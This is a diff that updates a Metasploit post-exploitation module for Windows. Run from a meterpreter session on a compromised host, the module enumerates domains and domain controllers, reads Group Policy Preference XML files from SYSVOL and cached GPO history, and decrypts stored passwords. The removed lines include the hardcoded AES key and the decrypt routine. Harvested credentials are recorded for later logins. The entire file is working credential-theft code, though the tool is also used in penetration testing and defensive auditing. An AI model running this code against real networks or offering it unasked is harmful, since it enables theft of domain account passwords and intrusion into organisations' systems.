@@ -1,457 +1,411 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-require 'rexml/document'
-require 'msf/core/post/windows/registry'
-require 'msf/core/post/windows/priv'
-require 'msf/core/auxiliary/report'
+class MetasploitModule < Msf::Post
+  include Msf::Auxiliary::Report
+  include Msf::Post::File
+  include Msf::Post::Windows::Priv
+  include Msf::Post::Windows::Registry
+  include Msf::Post::Windows::NetAPI
 
-class Metasploit3 < Msf::Post
-	include Msf::Auxiliary::Report
-	include Msf::Post::Windows::Priv
-	include Msf::Post::Windows::Registry
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Group Policy Preference Saved Passwords',
+        'Description' => %q{
+          This module enumerates the victim machine's domain controller and
+          connects to it via SMB. It then looks for Group Policy Preference XML
+          files containing local user accounts and passwords and decrypts them
+          using Microsofts public AES key.
 
-	def initialize(info={})
-		super( update_info( info,
-			'Name'          => 'Windows Gather Group Policy Preference Saved Passwords',
-			'Description'   => %q{
-				This module enumerates the victim machine's domain controller and
-				connects to it via SMB. It then looks for Group Policy Preference XML
-				files containing local user accounts and passwords and decrypts them
-				using Microsofts public AES key.
+          Cached Group Policy files may be found on end-user devices if the group
+          policy object is deleted rather than unlinked.
 
-				Tested on WinXP SP3 Client and Win2k8 R2 DC.
-			},
-			'License'       => MSF_LICENSE,
-			'Author'        =>[
-				'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',
-				'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
-				'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
-				'theLightCosine',
-				'mubix' #domain/dc enumeration code
-				],
-			'References'    =>
-				[
-					['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences'],
-					['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
-					['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
-					['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx']
-				],
-			'Platform'      => [ 'win' ],
-			'SessionTypes'  => [ 'meterpreter' ]
-		))
+          Tested on WinXP SP3 Client and Win2k8 R2 DC.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Ben Campbell',
+          'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
+          'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
+          'theLightCosine',
+          'mubix' # domain/dc enumeration code
+        ],
+        'References' => [
+          ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
+          ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
+          ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
+          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/'],
+          ['MSB', 'MS14-025']
+        ],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              extapi_adsi_domain_query
+            ]
+          }
+        }
+      )
+    )
 
-		register_options([
-			OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
-			OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
-			OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
-	end
+    register_options([
+      OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
+      OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
+      OptString.new('DOMAINS', [false, 'Enumerate list of space separated domains DOMAINS="dom1 dom2".'])
+    ])
+  end
 
-	def run
-		group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
-		group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
-		service_path = "MACHINE\\Preferences\\Services\\Services.xml"
-		printer_path = "USER\\Preferences\\Printers\\Printers.xml"
-		drive_path = "USER\\Preferences\\Drives\\Drives.xml"
-		datasource_path = "MACHINE\\Preferences\\Datasources\\DataSources.xml"
-		datasource_path_user = "USER\\Preferences\\Datasources\\DataSources.xml"
-		task_path = "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
-		task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
+  def run
+    group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
+    group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
+    service_path = "MACHINE\\Preferences\\Services\\Services.xml"
+    printer_path = "USER\\Preferences\\Printers\\Printers.xml"
+    drive_path = "USER\\Preferences\\Drives\\Drives.xml"
+    datasource_path = "MACHINE\\Preferences\\Datasources\\DataSources.xml"
+    datasource_path_user = "USER\\Preferences\\Datasources\\DataSources.xml"
+    task_path = "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
+    task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
 
-		domains = []
-		basepaths = []
-		fullpaths = []
-		cached_domain_controller = nil
+    domains = []
+    basepaths = []
+    fullpaths = []
 
-		print_status "Checking locally..."
-		locals = get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL\\sysvol"))
-		unless locals.blank?
-			basepaths << locals
-			print_good "Group Policy Files found locally"
-		end
+    print_status "Checking for group policy history objects..."
+    all_users = get_env("%ALLUSERSPROFILE%")
 
-		# If user supplied domains this implicitly cancels the ALL flag.
-		if datastore['ALL'] and datastore['DOMAINS'].blank?
-			print_status "Enumerating Domains on the Network..."
-			domains = enum_domains
-			domains.reject!{|n| n == "WORKGROUP" || n.to_s.empty?}
-		end
+    unless all_users.include? 'ProgramData'
+      all_users = "#{all_users}\\Application Data"
+    end
 
-		# Add user specified domains to list.
-		unless datastore['DOMAINS'].blank?
-			if datastore['DOMAINS'].match(/\./)
-				print_error "DOMAINS must not contain DNS style domain names e.g. 'mydomain.net'. Instead use 'mydomain'."
-				return
-			end
-			user_domains = datastore['DOMAINS'].split(' ')
-			user_domains = user_domains.map {|x| x.upcase}
-			print_status "Enumerating the user supplied Domain(s): #{user_domains.join(', ')}..."
-			user_domains.each{|ud| domains << ud}
-		end
+    cached = get_basepaths("#{all_users}\\Microsoft\\Group Policy\\History", true)
 
-		# If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again.
-		# If user supplied domains we do not wish to enumerate registry retrieved domains.
-		if locals.blank? && user_domains.blank?
-			print_status "Enumerating domain information from the local registry..."
-			domains << get_domain_reg
-		end
+    unless cached.blank?
+      basepaths << cached
+      print_good "Cached Group Policy folder found locally"
+    end
 
-		domains.flatten!
-		domains.compact!
-		domains.uniq!
+    print_status "Checking for SYSVOL locally..."
+    system_root = expand_path("%SYSTEMROOT%")
+    locals = get_basepaths("#{system_root}\\SYSVOL\\sysvol")
+    unless locals.blank?
+      basepaths << locals
+      print_good "SYSVOL Group Policy Files found locally"
+    end
 
-		# Dont check registry if we find local files.
-		cached_dc = get_cached_domain_controller if locals.blank?
+    # If user supplied domains this implicitly cancels the ALL flag.
+    if datastore['ALL'] and datastore['DOMAINS'].blank?
+      print_status "Enumerating Domains on the Network..."
+      domains = enum_domains
+      domains.reject! { |n| n == "WORKGROUP" || n.to_s.empty? }
+    end
 
-		domains.each do |domain|
-			dcs = enum_dcs(domain)
-			dcs = [] if dcs.nil?
+    # Add user specified domains to list.
+    unless datastore['DOMAINS'].blank?
+      if datastore['DOMAINS'].match(/\./)
+        print_error "DOMAINS must not contain DNS style domain names e.g. 'mydomain.net'. Instead use 'mydomain'."
+        return
+      end
+      user_domains = datastore['DOMAINS'].split(' ')
+      user_domains = user_domains.map { |x| x.upcase }
+      print_status "Enumerating the user supplied Domain(s): #{user_domains.join(', ')}..."
+      user_domains.each { |ud| domains << ud }
+    end
 
-			# Add registry cached DC for the test case where no DC is enumerated on the network.
-			if !cached_dc.nil? && (cached_dc.include? domain)
-				dcs << cached_dc
-			end
+    # If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again.
+    # If user supplied domains we do not wish to enumerate registry retrieved domains.
+    if locals.blank? && user_domains.blank?
+      print_status "Enumerating domain information from the local registry..."
+      domains << get_domain_reg
+    end
 
-			next if dcs.blank?
-			dcs.uniq!
-			tbase = []
-			dcs.each do |dc|
-				print_status "Searching for Policy Share on #{dc}..."
-				tbase = get_basepaths("\\\\#{dc}\\SYSVOL")
-				#If we got a basepath from the DC we know that we can reach it
-				#All DCs on the same domain should be the same so we only need one
-				unless tbase.blank?
-					print_good "Found Policy Share on #{dc}"
-					basepaths << tbase
-					break
-				end
-			end
-		end
+    domains.flatten!
+    domains.compact!
+    domains.uniq!
 
-		basepaths.flatten!
-		basepaths.compact!
-		print_status "Searching for Group Policy XML Files..."
-		basepaths.each do |policy_path|
-			fullpaths << find_path(policy_path, group_path)
-			fullpaths << find_path(policy_path, group_path_user)
-			fullpaths << find_path(policy_path, service_path)
-			fullpaths << find_path(policy_path, printer_path)
-			fullpaths << find_path(policy_path, drive_path)
-			fullpaths << find_path(policy_path, datasource_path)
-			fullpaths << find_path(policy_path, datasource_path_user)
-			fullpaths << find_path(policy_path, task_path)
-			fullpaths << find_path(policy_path, task_path_user)
-		end
-		fullpaths.flatten!
-		fullpaths.compact!
-		fullpaths.each do |filepath|
-			tmpfile = gpp_xml_file(filepath)
-			parse_xml(tmpfile) if tmpfile
-		end
+    # Dont check registry if we find local files.
+    cached_dc = get_cached_domain_controller if locals.blank?
 
-	end
+    domains.each do |domain|
+      dcs = enum_dcs(domain)
+      dcs = [] if dcs.nil?
 
-	def get_basepaths(base)
-		locals = []
-		begin
-			session.fs.dir.foreach(base) do |sub|
-				next if sub =~ /^(\.|\.\.)$/
-				tpath = "#{base}\\#{sub}\\Policies"
-				begin
-					session.fs.dir.foreach(tpath) do |sub2|
-						next if sub =~ /^(\.|\.\.)$/
-						locals << "#{tpath}\\#{sub2}\\"
-					end
-				rescue Rex::Post::Meterpreter::RequestError => e
-					print_error "Could not access #{tpath}  : #{e.message}"
-				end
-			end
-		rescue Rex::Post::Meterpreter::RequestError => e
-			print_error "Error accessing #{base} : #{e.message}"
-		end
-		return locals
-	end
+      # Add registry cached DC for the test case where no DC is enumerated on the network.
+      if !cached_dc.nil? && (cached_dc.include? domain)
+        dcs << cached_dc
+      end
 
-	def find_path(path, xml_path)
-		xml_path = "#{path}#{xml_path}"
-		begin
-			return xml_path if client.fs.file.stat(xml_path)
-		rescue Rex::Post::Meterpreter::RequestError => e
-			# No permissions for this specific file.
-			return nil
-		end
-	end
+      next if dcs.blank?
 
-	def gpp_xml_file(path)
-		begin
-			groups = client.fs.file.new(path,'r')
-			until groups.eof
-				data = groups.read
-			end
+      dcs.uniq!
+      tbase = []
+      dcs.each do |dc|
+        print_status "Searching for Policy Share on #{dc}..."
+        tbase = get_basepaths("\\\\#{dc}\\SYSVOL")
+        # If we got a basepath from the DC we know that we can reach it
+        # All DCs on the same domain should be the same so we only need one
+        unless tbase.blank?
+          print_good "Found Policy Share on #{dc}"
+          basepaths << tbase
+          break
+        end
+      end
+    end
 
-			spath = path.split('\\')
-			retobj = {
-				:dc     => spath[2],
-				:path   => path,
-				:xml    => REXML::Document.new(data).root
-			}
-			if spath[4] == "sysvol"
-				retobj[:domain] = spath[5]
-			else
-				retobj[:domain] = spath[4]
-			end
-			return retobj
-		rescue Rex::Post::Meterpreter::RequestError => e
-			print_error "Received error code #{e.code} when reading #{path}"
-			return nil
-		end
-	end
+    basepaths.flatten!
+    basepaths.compact!
+    print_status "Searching for Group Policy XML Files..."
+    basepaths.each do |policy_path|
+      fullpaths << find_path(policy_path, group_path)
+      fullpaths << find_path(policy_path, group_path_user)
+      fullpaths << find_path(policy_path, service_path)
+      fullpaths << find_path(policy_path, printer_path)
+      fullpaths << find_path(policy_path, drive_path)
+      fullpaths << find_path(policy_path, datasource_path)
+      fullpaths << find_path(policy_path, datasource_path_user)
+      fullpaths << find_path(policy_path, task_path)
+      fullpaths << find_path(policy_path, task_path_user)
+    end
+    fullpaths.flatten!
+    fullpaths.compact!
+    fullpaths.each do |filepath|
+      tmpfile = gpp_xml_file(filepath)
+      parse_xml(tmpfile) if tmpfile
+    end
+  end
 
-	def parse_xml(xmlfile)
-		mxml = xmlfile[:xml]
-		print_status "Parsing file: #{xmlfile[:path]} ..."
-		filetype = xmlfile[:path].split('\\').last()
-		mxml.elements.to_a("//Properties").each do |node|
-			epassword = node.attributes['cpassword']
-			next if epassword.to_s.empty?
-			pass = decrypt(epassword)
+  def get_basepaths(base, cached = false)
+    locals = []
+    begin
+      session.fs.dir.foreach(base) do |sub|
+        next if sub =~ /^(\.|\.\.)$/
 
-			user = node.attributes['runAs'] if node.attributes['runAs']
-			user = node.attributes['accountName'] if node.attributes['accountName']
-			user = node.attributes['username'] if node.attributes['username']
-			user = node.attributes['userName'] if node.attributes['userName']
-			user = node.attributes['newName'] unless node.attributes['newName'].blank?
-			changed = node.parent.attributes['changed']
+        # Local GPO are stored in C:\Users\All Users\Microsoft\Group
+        # Policy\History\{GUID}\Machine\etc without \Policies
+        if cached
+          locals << "#{base}\\#{sub}\\"
+        else
+          tpath = "#{base}\\#{sub}\\Policies"
 
-			# Printers and Shares
-			path = node.attributes['path']
+          begin
+            session.fs.dir.foreach(tpath) do |sub2|
+              next if sub2 =~ /^(\.|\.\.)$/
 
-			# Datasources
-			dsn = node.attributes['dsn']
-			driver = node.attributes['driver']
+              locals << "#{tpath}\\#{sub2}\\"
+            end
+          rescue Rex::Post::Meterpreter::RequestError => e
+            print_error "Could not access #{tpath}  : #{e.message}"
+          end
+        end
+      end
+    rescue Rex::Post::Meterpreter::RequestError => e
+      print_error "Error accessing #{base} : #{e.message}"
+    end
+    return locals
+  end
 
-			# Tasks
-			app_name = node.attributes['appName']
+  def find_path(path, xml_path)
+    xml_path = "#{path}#{xml_path}"
+    begin
+      return xml_path if exist? xml_path
+    rescue Rex::Post::Meterpreter::RequestError
+      # No permissions for this specific file.
+      return nil
+    end
+  end
 
-			# Services
-			service = node.attributes['serviceName']
+  def adsi_query(domain, adsi_filter, adsi_fields)
+    return "" unless session.core.use("extapi")
 
-			# Groups
-			expires = node.attributes['expires']
-			never_expires = node.attributes['neverExpires']
-			disabled = node.attributes['acctDisabled']
+    query_result = session.extapi.adsi.domain_query(domain, adsi_filter, 255, 255, adsi_fields)
 
-			table = Rex::Ui::Text::Table.new(
-				'Header'     => 'Group Policy Credential Info',
-				'Indent'     => 1,
-				'SortIndex'  => -1,
-				'Columns'    =>
-				[
-					'Name',
-					'Value',
-				]
-			)
+    if query_result[:results].empty?
+      return "" # adsi query failed
+    else
+      return query_result[:results]
+    end
+  end
 
-			table << ["TYPE", filetype]
-			table << ["USERNAME", user]
-			table << ["PASSWORD", pass]
-			table << ["DOMAIN CONTROLLER", xmlfile[:dc]]
-			table << ["DOMAIN", xmlfile[:domain] ]
-			table << ["CHANGED", changed]
-			table << ["EXPIRES", expires] unless expires.blank?
-			table << ["NEVER_EXPIRES?", never_expires] unless never_expires.blank?
-			table << ["DISABLED", disabled] unless disabled.blank?
-			table << ["PATH", path] unless path.blank?
-			table << ["DATASOURCE", dsn] unless dsn.blank?
-			table << ["DRIVER", driver] unless driver.blank?
-			table << ["TASK", app_name] unless app_name.blank?
-			table << ["SERVICE", service] unless service.blank?
+  def gpp_xml_file(path)
+    begin
+      data = read_file(path)
 
-			node.elements.each('//Attributes//Attribute') do |dsn_attribute|
-				table << ["ATTRIBUTE", "#{dsn_attribute.attributes['name']} - #{dsn_attribute.attributes['value']}"]
-			end
+      spath = path.split('\\')
+      retobj = {
+        :dc => spath[2],
+        :guid => spath[6],
+        :path => path,
+        :xml => data
+      }
+      if spath[4] == "sysvol"
+        retobj[:domain] = spath[5]
+      else
+        retobj[:domain] = spath[4]
+      end
 
-			print_good table.to_s
+      adsi_filter_gpo = "(&(objectCategory=groupPolicyContainer)(name=#{retobj[:guid]}))"
+      adsi_field_gpo = ['displayname', 'name']
 
-			if datastore['STORE']
-				stored_path = store_loot('windows.gpp.xml', 'text/plain', session, xmlfile[:xml], filetype, xmlfile[:path])
-				print_status("XML file saved to: #{stored_path}")
-			end
+      gpo_adsi = adsi_query(retobj[:domain], adsi_filter_gpo, adsi_field_gpo)
 
-			report_creds(user,pass) unless disabled and disabled == '1'
-		end
-	end
+      unless gpo_adsi.empty?
+        gpo_name = gpo_adsi[0][0][:value]
+        gpo_guid = gpo_adsi[0][1][:value]
+        retobj[:name] = gpo_name if retobj[:guid] == gpo_guid
+      end
 
-	def report_creds(user, pass)
-		if session.db_record
-			source_id = session.db_record.id
-		else
-			source_id = nil
-		end
+      return retobj
+    rescue Rex::Post::Meterpreter::RequestError => e
+      print_error "Received error code #{e.code} when reading #{path}"
+      return nil
+    end
+  end
 
-		report_auth_info(
-			:host  => session.sock.peerhost,
-			:port => 445,
-			:sname => 'smb',
-			:proto => 'tcp',
-			:source_id => source_id,
-			:source_type => "exploit",
-			:user => user,
-			:pass => pass)
-	end
+  def parse_xml(xmlfile)
+    mxml = xmlfile[:xml]
+    print_status "Parsing file: #{xmlfile[:path]} ..."
+    filetype = File.basename(xmlfile[:path].gsub("\\", "/"))
+    results = Rex::Parser::GPP.parse(mxml)
 
-	def decrypt(encrypted_data)
-		padding = "=" * (4 - (encrypted_data.length % 4))
-		epassword = "#{encrypted_data}#{padding}"
-		decoded = Rex::Text.decode_base64(epassword)
+    tables = Rex::Parser::GPP.create_tables(results, filetype, xmlfile[:domain], xmlfile[:dc])
 
-		key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
-		aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
-		aes.decrypt
-		aes.key = key
-		plaintext = aes.update(decoded)
-		plaintext << aes.final
-		pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion
+    tables.each do |table|
+      table << ['NAME', xmlfile[:name]] if xmlfile.member?(:name)
+      print_good " #{table.to_s}\n\n"
+    end
 
-		return pass
-	end
+    results.each do |result|
+      if datastore['STORE']
+        stored_path = store_loot('microsoft.windows.gpp', 'text/xml', session, xmlfile[:xml], filetype, xmlfile[:path])
+        print_good("XML file saved to: #{stored_path}")
+        print_line
+      end
 
-	def enum_domains
-		domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
-		buffersize = 500
-		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
-		# Estimate new buffer size on percentage recovered.
-		percent_found = (result['entriesread'].to_f/result['totalentries'].to_f)
-		if percent_found > 0
-			buffersize = (buffersize/percent_found).to_i
-		else
-			buffersize += 500
-		end
+      report_creds(result[:USER], result[:PASS], result[:DISABLED])
+    end
+  end
 
-		while result['return'] == 234
-			buffersize = buffersize + 500
-			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
-		end
+  def report_creds(user, password, disabled)
+    service_data = {
+      address: session.session_host,
+      port: 445,
+      protocol: "tcp",
+      service_name: "smb",
+      workspace_id: myworkspace_id
+    }
 
-		count = result['totalentries']
-		print_status("#{count} Domain(s) found.")
-		startmem = result['bufptr']
+    credential_data = {
+      origin_type: :session,
+      session_id: session_db_id,
+      post_reference_name: self.refname,
+      username: user,
+      private_data: password,
+      private_type: :password
+    }
 
-		base = 0
-		domains = []
+    credential_core = create_credential(credential_data.merge(service_data))
 
-		if count == 0
-			return domains
-		end
+    login_data = {
+      core: credential_core,
+      access_level: "User",
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }
 
-		mem = client.railgun.memread(startmem, 8*count)
+    create_credential_login(login_data.merge(service_data))
+  end
 
-		count.times do |i|
-				x = {}
-				x[:platform] = mem[(base + 0),4].unpack("V*")[0]
-				nameptr = mem[(base + 4),4].unpack("V*")[0]
-				x[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
-				domains << x[:domain]
-				base = base + 8
-		end
+  def enum_domains
+    domains = []
+    results = net_server_enum(SV_TYPE_DOMAIN_ENUM)
 
-		domains.uniq!
-		print_status "Retrieved Domain(s) #{domains.join(', ')} from network"
-		return domains
-	end
+    if results
+      results.each do |domain|
+        domains << domain[:name]
+      end
 
-	def enum_dcs(domain)
-		# Prevent crash if FQDN domain names are searched for or other disallowed characters:
-		# http://support.microsoft.com/kb/909264 \/:*?"<>|
-		if domain =~ /[:\*?"<>\\\/.]/
-			print_error("Cannot enumerate domain name contains disallowed characters: #{domain}")
-			return nil
-		end
+      domains.uniq!
+      print_status("Retrieved Domain(s) #{domains.join(', ')} from network")
+    end
 
-		print_status("Enumerating DCs for #{domain} on the network...")
-		domaincontrollers = 24  # 10 + 8 (SV_TYPE_DOMAIN_BAKCTRL || SV_TYPE_DOMAIN_CTRL)
-		buffersize = 500
-		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
-		while result['return'] == 234
-			buffersize = buffersize + 500
-			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
-		end
-		if result['totalentries'] == 0
-			print_error("No Domain Controllers found for #{domain}")
-			return nil
-		end
+    domains
+  end
 
-		count = result['totalentries']
-		startmem = result['bufptr']
+  def enum_dcs(domain)
+    hostnames = nil
+    # Prevent crash if FQDN domain names are searched for or other disallowed characters:
+    # http://support.microsoft.com/kb/909264 \/:*?"<>|
+    if domain =~ /[:\*?"<>\\\/.]/
+      print_error("Cannot enumerate domain name contains disallowed characters: #{domain}")
+      return nil
+    end
 
-		base = 0
-		mem = client.railgun.memread(startmem, 8*count)
-		hostnames = []
-		count.times{|i|
-			t = {}
-			t[:platform] = mem[(base + 0),4].unpack("V*")[0]
-			nameptr = mem[(base + 4),4].unpack("V*")[0]
-			t[:dc_hostname] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
-			base = base + 8
-			print_good "DC Found: #{t[:dc_hostname]}"
-			hostnames << t[:dc_hostname]
-		}
-		return hostnames
-	end
+    print_status("Enumerating DCs for #{domain} on the network...")
+    results = net_server_enum(SV_TYPE_DOMAIN_CTRL | SV_TYPE_DOMAIN_BAKCTRL, domain)
 
-	# We use this for the odd test case where a DC is unable to be enumerated from the network
-	# but is cached in the registry.
-	def get_cached_domain_controller
-		begin
-			subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\"
-			v_name = "DCName"
-			dc = registry_getvaldata(subkey, v_name).gsub(/\\/, '').upcase
-			print_status "Retrieved DC #{dc} from registry"
-			return dc
-		rescue
-			print_status("No DC found in registry")
-		end
-	end
+    if results.blank?
+      print_error("No Domain Controllers found for #{domain}")
+    else
+      hostnames = []
+      results.each do |dc|
+        print_good "DC Found: #{dc[:name]}"
+        hostnames << dc[:name]
+      end
+    end
 
-	def get_domain_reg
-		locations = []
-		# Lots of redundancy but hey this is quick!
-		locations << ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\", "Domain"]
-		locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "DefaultDomainName"]
-		locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\", "MachineDomain"]
+    hostnames
+  end
 
-		domains = []
+  # We use this for the odd test case where a DC is unable to be enumerated from the network
+  # but is cached in the registry.
+  def get_cached_domain_controller
+    begin
+      subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\"
+      v_name = "DCName"
+      dc = registry_getvaldata(subkey, v_name).gsub(/\\/, '').upcase
+      print_status "Retrieved DC #{dc} from registry"
+      return dc
+    rescue
+      print_status("No DC found in registry")
+    end
+  end
 
-		# Pulls cached domains from registry
-		domain_cache = registry_enumvals("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DomainCache\\")
-		if domain_cache
-			domain_cache.each { |ud| domains << ud }
-		end
+  def get_domain_reg
+    locations = []
+    # Lots of redundancy but hey this is quick!
+    locations << ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\", "Domain"]
+    locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "DefaultDomainName"]
+    locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\", "MachineDomain"]
 
-		locations.each do |location|
-			begin
-				subkey = location[0]
-				v_name = location[1]
-				domain = registry_getvaldata(subkey, v_name)
-			rescue Rex::Post::Meterpreter::RequestError => e
-				print_error "Received error code #{e.code} - #{e.message}"
-			end
+    domains = []
 
-			unless domain.blank?
-				domain_parts = domain.split('.')
-				domains << domain.split('.').first.upcase unless domain_parts.empty?
-			end
-		end
+    # Pulls cached domains from registry
+    domain_cache = registry_enumvals("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DomainCache\\")
+    if domain_cache
+      domain_cache.each { |ud| domains << ud }
+    end
 
-		domains.uniq!
-		print_status "Retrieved Domain(s) #{domains.join(', ')} from registry"
+    locations.each do |location|
+      begin
+        subkey = location[0]
+        v_name = location[1]
+        domain = registry_getvaldata(subkey, v_name)
+      rescue Rex::Post::Meterpreter::RequestError => e
+        print_error "Received error code #{e.code} - #{e.message}"
+      end
 
-		return domains
-	end
+      unless domain.blank?
+        domain_parts = domain.split('.')
+        domains << domain.split('.').first.upcase unless domain_parts.empty?
+      end
+    end
+
+    domains.uniq!
+    print_status "Retrieved Domain(s) #{domains.join(', ')} from registry"
+
+    return domains
+  end
 end
